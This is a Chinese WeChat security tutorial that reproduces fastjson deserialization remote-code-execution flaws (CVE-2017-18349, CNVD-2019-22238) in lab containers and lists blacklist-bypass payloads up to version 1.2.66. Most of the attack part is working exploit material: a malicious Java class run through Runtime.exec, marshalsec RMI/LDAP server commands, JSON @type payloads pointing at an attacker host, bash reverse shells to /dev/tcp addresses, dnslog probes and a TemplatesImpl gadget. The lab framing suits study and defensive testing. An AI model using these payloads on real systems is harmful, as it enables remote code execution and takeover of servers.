##  干货｜最全fastjson漏洞复现与绕过

原创 Alexis  [ HACK学习呀 ](javascript:void\(0\);)

**HACK学习呀** ![]()

微信号 Hacker1961X

功能介绍
HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！

____

__

收录于话题

#fastjson

1个

# 简介

Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java
对象。Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。

在进行fastjson的漏洞复现学习之前需要了解几个概念，如下：

## JNDI

`JNDI (Java Naming and Directory Interface)`是一组 **应用程序接口** ，提供了 **查找和访问**
命名和目录服务的通用、统一的接口，用于定位网络、用户、对象和服务等资源，是`J2EE`规范中是重要的规范之一。（可以理解为`JNDI`在`J2EE`中是一台交换机，将组件、资源、服务取了名字，再通过名字来查找）

`JNDI`底层支持`RMI`远程对象，`JNDI`接口可以访问和调用`RMI`注册过的服务。JNDI`根据名字动态加载数据，支持的服务有`DNS、LDAP、CORBA、RMI

## RMI

### 远程方法调用

远程方法调用是分布式编程中的一个基本思想。实现远程方法调用的技术有很多，比如：CORBA、WebService，这两种都是独立于编程语言的。而RMI（Remote
Method
Invocation）是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。RMI依赖的通信协议为JRMP(Java
Remote Message Protocol ，Java
远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI中对象是通过序列化方式进行编码传输的。

### 远程对象

使用远程方法调用，必然会涉及参数的传递和执行结果的返回。参数或者返回值可以是基本数据类型，当然也有可能是对象的引用。所以这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现
java.io.Serializable 接口，并且客户端的serialVersionUID字段要与服务器端保持一致。

任何可以被远程调用方法的对象必须实现 java.rmi.Remote
接口，远程对象的实现类必须继承UnicastRemoteObject类。如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法。如下：

    
    
    public class HelloImpl implements IHello {    protected HelloImpl() throws RemoteException {        UnicastRemoteObject.exportObject(this, 0);    }    @Override    public String sayHello(String name) {        System.out.println(name);        return name;    }}

在JVM之间通信时，RMI对远程对象和非远程对象的处理方式是不一样的，它并没有直接把远程对象复制一份传递给客户端，而是传递了一个远程对象的Stub，Stub基本上相当于是远程对象的引用或者代理。Stub对开发者是透明的，客户端可以像调用本地方法一样直接通过它来调用远程方法。Stub中包含了远程对象的定位信息，如Socket端口、服务端主机地址等等，并实现了远程调用过程中具体的底层网络通信细节，所以RMI远程调用逻辑是这样的：

![](https://gitee.com/fuli009/images/raw/master/public/20210822095638.png)

从逻辑上来看，数据是在Client和Server之间横向流动的，但是实际上是从Client到Stub，然后从Skeleton到Server这样纵向流动的。

1.Server端监听一个端口，这个端口是JVM随机选择的；2.Client端并不知道Server远程对象的通信地址和端口，但是Stub中包含了这些信息，并封装了底层网络操作；3.Client端可以调用Stub上的方法；4.Stub连接到Server端监听的通信端口并提交参数；5.远程Server端上执行具体的方法，并返回结果给Stub；6.Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样；

那怎么获取Stub呢？

### RMI注册表

Stub的获取方式有很多，常见的方法是调用某个远程服务上的方法，向远程服务获取存根。但是调用远程方法又必须先有远程对象的Stub，所以这里有个死循环问题。JDK提供了一个RMI注册表（RMIRegistry）来解决这个问题。RMIRegistry也是一个远程对象，默认监听在传说中的1099端口上，可以使用代码启动RMIRegistry，也可以使用rmiregistry命令。

要注册远程对象，需要RMI URL和一个远程对象的引用。

    
    
    IHello rhello = new HelloImpl();LocateRegistry.createRegistry(1099);Naming.bind("rmi://0.0.0.0:1099/hello", rhello);

LocateRegistry.getRegistry()会使用给定的主机和端口等信息本地创建一个Stub对象作为Registry远程对象的代理，从而启动整个远程调用逻辑。服务端应用程序可以向RMI注册表中注册远程对象，然后客户端向RMI注册表查询某个远程对象名称，来获取该远程对象的Stub。

    
    
    Registry registry = LocateRegistry.getRegistry("kingx_kali_host",1099);IHello rhello = (IHello) registry.lookup("hello");rhello.sayHello("test");

使用RMI Registry之后，RMI的调用关系是这样的：

![](https://gitee.com/fuli009/images/raw/master/public/20210822095639.png)

所以其实从客户端角度看，服务端应用是有两个端口的，一个是RMI
Registry端口（默认为1099），另一个是远程对象的通信端口（随机分配的）。这个通信细节比较重要，真实利用过程中可能会在这里遇到一些坑。

### 动态加载类

RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，服务端返回值也可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，则同样需要有运行时动态加载额外类的能力。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。

这个概念比较重要，JNDI注入的利用方法中也借助了动态加载类的思路。

这里涉及到的角色：客户端、RMI注册表、远程对象服务器、托管class文件的Web服务器可以分别位于不同的主机上：

![](https://gitee.com/fuli009/images/raw/master/public/20210822095640.png)

## LDAP

`LDAP(Lightweight Directory Access Protocol)`是轻量级目录访问协议，用于 **访问目录服务**
，基于X.500目录访问协议

## JNDI注入

简单来说，JNDI (Java Naming and Directory Interface)
是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI在局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。

JNDI支持多种命名和目录提供程序（Naming and Directory Providers），RMI注册表服务提供程序（RMI Registry
Service
Provider）允许通过JNDI应用接口对RMI中注册的远程对象进行访问操作。将RMI服务绑定到JNDI的一个好处是更加透明、统一和松散耦合，RMI客户端直接通过URL来定位一个远程对象，而且该RMI服务可以和包含人员，组织和网络资源等信息的企业目录链接在一起。

![](https://gitee.com/fuli009/images/raw/master/public/20210822095641.png)

JNDI接口在初始化时，可以将RMI URL作为参数传入，而JNDI注入就出现在客户端的lookup()函数中，如果lookup()的参数可控就可能被攻击。

    
    
    Hashtable env = new Hashtable();env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");//com.sun.jndi.rmi.registry.RegistryContextFactory 是RMI Registry Service Provider对应的Factoryenv.put(Context.PROVIDER_URL, "rmi://kingx_kali:8080");Context ctx = new InitialContext(env);Object local_obj = ctx.lookup("rmi://kingx_kali:8080/test");

# CVE-2017-18349

CVE-2017-18349即Fastjson1.2.24 反序列化漏洞RCE

## 漏洞原理

fastjson在解析json对象时，会使用autoType实例化某一个具体的类，并调用set/get方法访问属性。漏洞出现在Fastjson
autoType处理json对象时，没有对@type字段进行完整的安全性验证，我们可以传入危险的类并调用危险类连接远程RMI服务器，通过恶意类执行恶意代码，进而实现远程代码执行漏洞。

影响版本为 fastjson < 1.2.25

## 漏洞复现

首先进入fastjson 1.2.24的docker环境，使用`java
-version`查看一下java的版本为1.8.0_102。因为java环境为102，没有`com.sun.jndi.rmi.object.trustURLCodebase`的限制，可以使用`com.sun.rowset.JdbcRowSetImpl`利用链结合JNDI注入执行远程命令

![](https://gitee.com/fuli009/images/raw/master/public/20210822095642.png)

安装javac环境，这里直接使用20版本替换102

    
    
    cd /optcurl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gztar zxvf jdk-8u20-linux-x64.tar.gzrm -rf /usr/bin/java*ln -s /opt/jdk1.8.0_20/bin/j* /usr/binjavac -versionjava -version

执行命令完成之后发现java版本已经变成了20

![](https://gitee.com/fuli009/images/raw/master/public/20210822095643.png)

编辑恶意类代码，起名为evilclass.java

    
    
    import java.lang.Runtime;import java.lang.Process;public class evilclass{static {try {Runtime rt = Runtime.getRuntime();String[] commands = {"touch", "/tmp/test"};Process pc = rt.exec(commands);pc.waitFor();} catch (Exception e) {// do nothing}}}

使用javac编译evilclass.java文件生成evilclass.class

![]()

这里需要搭建RMI服务，首先下载marshalsec

    
    
    git clone https://github.com/mbechler/marshalsec.git

安装maven并编译marshalsec生成jar

    
    
    apt-get install mavenmvn clean package -DskipTests

![](https://gitee.com/fuli009/images/raw/master/public/20210822095644.png)

稍微等一下，可以看到已经创建成功

![](https://gitee.com/fuli009/images/raw/master/public/20210822095645.png)

我们进入到marshalsec的target目录里面进行查看已经生成了marshalsec-0.0.3.3-SNAPSHOT-
all.jar，然后使用marshalsec搭建一个RMI服务器，这里的ip就是你攻击机的ip，端口可以随意

这里也可以使用启动LDAP服务，效果是一样的

    
    
    lsjava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.1.8/#evilclass" 9999java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.1.8/#evilclass" 9999

这里我使用RMI，可以看到请求成功

![](https://gitee.com/fuli009/images/raw/master/public/20210822095646.png)

bp在靶机的fastjson页面抓包

![](https://gitee.com/fuli009/images/raw/master/public/20210822095647.png)

这里需要改的有三个地方，第一个地方需要把GET方法改成POST方法，第二个地方需要添加Content-
Type:application/json，第三个地方就是写入漏洞利用的poc

    
    
    {"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://192.168.1.8:9999/evilclass","autoCommit":true}}

发包即可

![](https://gitee.com/fuli009/images/raw/master/public/20210822095648.png)

进入docker里查看发现已经创建了test文件

![](https://gitee.com/fuli009/images/raw/master/public/20210822095649.png)

若需要反弹shell只需要把java文件中的`String[] commands`改为bash反弹命令即可，这里不再赘述

    
    
    import java.lang.Runtime;import java.lang.Process;public class evilclass{static {try {Runtime rt = Runtime.getRuntime();String[] commands = {"/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.1.8/9001 0>&1"};Process pc = rt.exec(commands);pc.waitFor();} catch (Exception e) {// do nothing}}}

# CNVD‐2019‐22238

CNVD-2019-22238即Fastjson1.2.47 反序列化漏洞

## 漏洞原理

Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型，其次，Fastjson自定义的反序列化机制时会调用指定类中的setter方法及部分getter方法，那么当组件开启了autotype功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，若指定类的指定方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。并且在Fastjson
1.2.47及以下版本中，利用其缓存机制可实现对未开启autotype功能的绕过。

影响版本为 `fastjson < 1.2.47`

## 漏洞复现

首先进入1.2.47的docker环境

![](https://gitee.com/fuli009/images/raw/master/public/20210822095650.png)

这里的jdk版本还是8u102，这个版本没有com.sun.jndi.rmi.object.trustURLCodebase的限制，可以继续利用RMI或者LDAP进行命令执行

上面用了RMI进行命令执行，这里使用LDAP进行漏洞复现

LDAP使用的工具为fastjson_tool，首先clone到本地

    
    
    git clone https://github.com/wyzxxz/fastjson_rce_tool.git

首先启动LDAP服务，8888为LDAP服务的端口，后面跟的是bash反弹shell的命令

    
    
    java -cp fastjson_tool.jar fastjson.HLDAPServer 192.168.1.8 8888 "bash=/bin/bash -i  >& /dev/tcp/192.168.1.10/9001 0>&1"

这里执行命令之后给出了两个payload，我们使用下面这个payload复制一下

![](https://gitee.com/fuli009/images/raw/master/public/20210822095651.png)

这里还是跟上面一样需要改GET方法为POST方法，添加Content-Type:application/json，在就是把之前生成的payload复制

    
    
    {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://192.168.1.8:8888/Object","autoCommit":true}}

发包使用nc监听8888端口即可收到反弹shell

![](https://gitee.com/fuli009/images/raw/master/public/20210822095652.png)

# fastjson深入探究

首先如何快速判断是否使用了fastjson呢

第一种方法就是使用报错回显

这里首先在web页面抓包

![](https://gitee.com/fuli009/images/raw/master/public/20210822095653.png)

然后修改GET为POST，添加`Content-Type:application/json`，在发送一个`{"test":"`，即可得到回显

![](https://gitee.com/fuli009/images/raw/master/public/20210822095654.png)

第二种方法就是使用dnslog测试，使用如下payload，这里的dnslog使用dnslog获得的网址进行替换即可

    
    
    {"@type":"java.net.Inet4Address","val":"dnslog"}{"@type":"java.net.Inet6Address","val":"dnslog"}{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"dnslog"}}""}    {{"@type":"java.net.URL","val":"dnslog"}:"aaa"}Set[{"@type":"java.net.URL","val":"dnslog"}]Set[{"@type":"java.net.URL","val":"dnslog"}{{"@type":"java.net.URL","val":"dnslog"}:0

第三种方法就是使用nc监听端口，在之前漏洞复现中已经讲过，就不再赘述了

我们在前面用到的都是远程加载RMI或LDAP服务端上的恶意类，即远程加载恶意类，在一些情况下，这种远程加载恶意类的方法并不能百分之百能够利用成功，这里就可以使用本地利用方式，就可以不用远程加载恶意类

首先生成test.java文件

    
    
    import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; public class Test extends AbstractTranslet {    public Test() throws IOException {        Runtime.getRuntime().exec("ping test.0g7slo.dnslog.cn");    }     @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {    }     public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {     }     public static void main(String[] args) throws Exception {        Test t = new Test();    }}

这里就可以ping一下dnslog来查看攻击是否成功，这里还有一种情况就是fastjson在真实情况下不出网，那么肯定是不能ping通的，这时候我们就可以选择写入webshell到web路径，前提是要知道绝对路径，或者是使用无文件回显来利用

编译test.java生成class类文件

    
    
    javac test.java

然后对class类文件进行base64编码，这里使用到py脚本

    
    
    import base64fin = open(r"test.class", "rb")fout = open(r"base64.txt", "w")s = base64.encodestring(fin.read()).replace("\n", "")fout.write(s)fin.close()fout.close()

运行之后就会把test.class文件转换为base64.txt文件，这时候再把base64.txt文件替换到payload中即可在dnslog中回显

![](https://gitee.com/fuli009/images/raw/master/public/20210822095655.png)image-20210819102057605

## < 1.2.41

第一个Fastjson反序列化漏洞爆出后，阿里在1.2.25版本设置了autoTypeSupport属性默认为false，并且增加了checkAutoType()函数，通过黑白名单的方式来防御Fastjson反序列化漏洞，因此后面发现的Fastjson反序列化漏洞都是针对黑名单绕过来实现攻击利用的目的的。

com.sun.rowset.jdbcRowSetlmpl在1.2.25版本被加入了黑名单，fastjson有个判断条件判断类名是否以"L"开头、以";"结尾，是的话就提取出其中的类名在加载进来

那么就可以构造如下exp

    
    
    {               "@type":"Lcom.sun.rowset.JdbcRowSetImpl;",    "dataSourceName":"rmi://ip:9999/rce_1_2_24_exploit",    "autoCommit":true}

## < 1.2.42

阿里在发现这个绕过漏洞之后做出了类名如果为`L`开头，;结尾的时候就先去掉`L`和`;`进行黑名单检验的方法，但是没有考虑到双写或多写的情况，也就是说这种方法只能防御一组`L`和`;`，构造exp如下，即双写`L`和`;`

    
    
    {               "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",    "dataSourceName":"rmi://x.x.x.x:9999/exp",    "autoCommit":true}

## < 1.2.47

在1.2.47版本及以下的情况下，loadClass中默认cache为true，首先使用java.lang.Class把获取到的类缓存到mapping中，然后直接从缓存中获取到了com.sun.rowset.jdbcRowSetlmpl这个类，即可绕过黑名单

    
    
    { "a": { "@type": "java.lang.Class",  "val": "com.sun.rowset.JdbcRowSetImpl" },  "b": { "@type": "com.sun.rowset.JdbcRowSetImpl",  "dataSourceName": "rmi://ip:9999/exp",  "autoCommit": true }}

## < 1.2.66

基于黑名单绕过，autoTypeSupport属性为true才能使用，在1.2.25版本之后autoTypeSupport默认为false

    
    
    {"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://ip:1389/Calc"}{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://ip:1389/Calc"}{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://ip:1389/Calc"}

  

**![](https://gitee.com/fuli009/images/raw/master/public/20210822095656.png)**

  

 **推荐阅读：**

  

 **[干货 |
Spring系列CVE以及POC编写](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247498027&idx=1&sn=6800b032fb7d44edf98b8a95187a3d73&chksm=ec1cac14db6b25022aecbca4b54b9e76f8c5de9a448d0fcc4f36b7ef45daaa25b32829c24b6b&scene=21#wechat_redirect)  
**

  

 **[干货｜Java
Spring安全学习笔记](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247499429&idx=1&sn=a96a0e81109294703d6a5192fce7ca2a&chksm=ec1cab9adb6b228cac06a76d3db1928b1bde0b4338065c5e9d62f3dded94cc54a4f04cf123d2&scene=21#wechat_redirect)**  

  

[ **干货 |
最全的Weblogic漏洞复现**](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247498979&idx=1&sn=254f5fd3cde4cf3a4bcdcce58c1029f1&chksm=ec1ca9dcdb6b20ca20ea2838ddaf3ba17fdf239fb057db49ac866bf4d94f70518915801fcc6d&scene=21#wechat_redirect)  

  

[
**干货｜最全的Tomcat漏洞复现**](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247499491&idx=1&sn=d733ae33b91bca49e6b2346502823940&chksm=ec1cabdcdb6b22ca62fbd204d2da5f7fbce8874cf4072e1cd55cbc92e8a829aea55994a8fc52&scene=21#wechat_redirect)  

  

[
**干货｜最全的Jboss漏洞复现**](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247499574&idx=1&sn=3ed1c53f23cdfe0858f0710a2e692fa5&chksm=ec1caa09db6b231fe17d399a14269de5800e22c0da2d56aa9472d0a9f52f33e4e7f51b0eb0b9&scene=21#wechat_redirect)  

  

 **点赞，转发，在看**

  

原创投稿作者：Alexis

![](https://gitee.com/fuli009/images/raw/master/public/20210822095657.png)

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

干货｜最全fastjson漏洞复现与绕过

最多200字，当前共字

__

发送中

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

